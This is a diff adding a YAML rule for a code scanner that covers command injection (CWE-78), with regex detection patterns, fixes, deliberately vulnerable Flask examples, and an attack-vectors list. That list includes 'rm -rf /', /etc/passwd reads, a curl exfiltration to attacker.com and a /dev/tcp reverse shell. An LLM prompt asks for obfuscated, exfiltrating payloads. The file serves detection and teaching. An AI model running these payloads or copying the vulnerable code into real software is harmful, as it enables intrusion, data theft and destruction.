@@ -1,0 +1,210 @@
+id: command-injection
+name: Command Injection
+category: injection
+severity: critical
+cwe: CWE-78
+owasp: A01:2021-Injection
+
+description: |
+  Command injection occurs when untrusted user input is used to construct system commands without proper
+  validation or sanitization, allowing attackers to execute arbitrary operating system commands.
+
+references:
+  - https://owasp.org/www-community/attacks/Command_Injection
+  - https://cwe.mitre.org/data/definitions/78.html
+
+affected_languages:
+  - python
+  - javascript
+  - ruby
+  - php
+  - bash
+
+affected_frameworks:
+  - flask
+  - django
+  - fastapi
+  - express
+
+detection:
+  static:
+    - pattern: "subprocess\\.(call|run|Popen|check_output)\\(.*shell=True.*\\)"
+      description: subprocess with shell=True is vulnerable to command injection
+      confidence: critical
+
+    - pattern: "os\\.system\\(.*request\\..*\\)"
+      description: os.system() with user input
+      confidence: critical
+
+    - pattern: "os\\.popen\\(.*request\\..*\\)"
+      description: os.popen() with user input
+      confidence: critical
+
+    - pattern: "os\\.spawn\\(.*request\\..*\\)"
+      description: os.spawn() with user input
+      confidence: critical
+
+    - pattern: "commands\\.(getoutput|getstatusoutput)\\(.*\\)"
+      description: commands module with user input (deprecated but dangerous)
+      confidence: critical
+
+    - pattern: "exec\\(.*request\\..*\\)"
+      description: exec() with user input
+      confidence: critical
+
+    - pattern: "eval\\(.*request\\..*\\)"
+      description: eval() with user input
+      confidence: critical
+
+    - pattern: "child_process\\.(exec|spawn|execSync|spawnSync)\\(.*\\$\\{.*\\}"
+      description: Node.js child_process with user input
+      confidence: critical
+      requires_language: [javascript, typescript]
+
+  data_flow:
+    - source: "request.(json|form|args|values|headers|cookies|body|query)"
+      sink: "(subprocess|os|commands|exec|eval|child_process)"
+      sanitizers:
+        - "(shlex\\.quote|quote|sanitize|escape)"
+
+remediation:
+  description: Use subprocess without shell=True or use parameterized APIs
+
+  code_before: |
+    @app.route('/ping')
+    def ping():
+      host = request.args.get('host')
+      result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)
+      return result.stdout.decode()
+
+  code_after: |
+    @app.route('/ping')
+    def ping():
+      host = request.args.get('host')
+      result = subprocess.run(['ping', '-c', '1', host], capture_output=True)
+      return result.stdout.decode()
+
+  code_before_validate: |
+    import shlex
+
+    @app.route('/ping')
+    def ping():
+      host = request.args.get('host')
+      # Validate hostname
+      if not re.match(r'^[a-zA-Z0-9.-]+$', host):
+          return "Invalid hostname", 400
+      result = subprocess.run(['ping', '-c', '1', host], capture_output=True)
+      return result.stdout.decode()
+
+examples:
+  vulnerable:
+    - |
+      @app.route('/dns')
+      def dns_lookup():
+          domain = request.args.get('domain')
+          result = os.system(f"nslookup {domain}")
+          return f"Result: {result}"
+
+    - |
+      @app.route('/process')
+      def process_file():
+          filename = request.args.get('file')
+          subprocess.run(f"cat {filename}", shell=True, check=True)
+          return "Processed"
+
+    - |
+      @app.route('/whois')
+      def whois():
+          target = request.args.get('target')
+          output = subprocess.check_output(f"whois {target}", shell=True)
+          return output.decode()
+
+    - |
+      @app.route('/scan')
+      def scan_port():
+          ip = request.args.get('ip')
+          port = request.args.get('port')
+          result = subprocess.Popen(f"nc -zv {ip} {port}", shell=True)
+          return "Scanning..."
+
+  secure:
+    - |
+      @app.route('/dns')
+      def dns_lookup():
+          domain = request.args.get('domain')
+          # Validate domain format
+          if not re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain):
+              return "Invalid domain", 400
+          result = subprocess.run(['nslookup', domain], capture_output=True)
+          return result.stdout.decode()
+
+    - |
+      @app.route('/process')
+      def process_file():
+          filename = request.args.get('file')
+          # Sanitize filename and ensure it's within allowed directory
+          safe_filename = os.path.basename(filename)
+          safe_path = os.path.join('/safe/directory', safe_filename)
+          subprocess.run(['cat', safe_path], check=True)
+          return "Processed"
+
+    - |
+      @app.route('/whois')
+      def whois():
+          target = request.args.get('target')
+          output = subprocess.check_output(['whois', target])
+          return output.decode()
+
+attack_vectors:
+  - vector: "Command Chaining"
+    payload: "8.8.8.8; rm -rf /"
+    description: Execute multiple commands using semicolon
+
+  - vector: "Pipe Command Chaining"
+    payload: "8.8.8.8 | cat /etc/passwd"
+    description: Pipe output to another command
+
+  - vector: "Command Substitution"
+    payload: "8.8.8.8 && cat /etc/passwd"
+    description: Execute second command if first succeeds
+
+  - vector: "Backtick Execution"
+    payload: "`whoami`"
+    description: Use backticks to execute commands (bash)
+
+  - vector: "Newline Injection"
+    payload: "8.8.8.8\ncat /etc/passwd"
+    description: Execute commands using newline character
+
+  - vector: "Blind Command Injection"
+    payload: "8.8.8.8; sleep 10"
+    description: Test for command injection using timing
+
+  - vector: "Out-of-Band Exfiltration"
+    payload: "8.8.8.8; curl http://attacker.com/$(whoami)"
+    description: Exfiltrate data via HTTP request
+
+  - vector: "Reverse Shell"
+    payload: "8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    description: Establish reverse shell connection
+
+llm_prompts:
+  analyze: |
+    Analyze this code for command injection vulnerabilities. Focus on:
+    1. subprocess calls with shell=True
+    2. os.system() and os.popen() calls
+    3. User input in command construction
+    4. Missing input validation and sanitization
+    5. Direct string concatenation with shell commands
+
+    For each vulnerability:
+    - Identify the specific vulnerable line
+    - Explain the attack scenario
+    - Provide secure alternative code
+
+  generate_attack: |
+    Generate a command injection attack for this vulnerable ping function. The attack should:
+    1. Chain additional commands after the ping
+    2. Attempt to read sensitive files (/etc/passwd)
+    3. Demonstrate data exfiltration via DNS or HTTP
+    4. Show both a simple and obfuscated payload
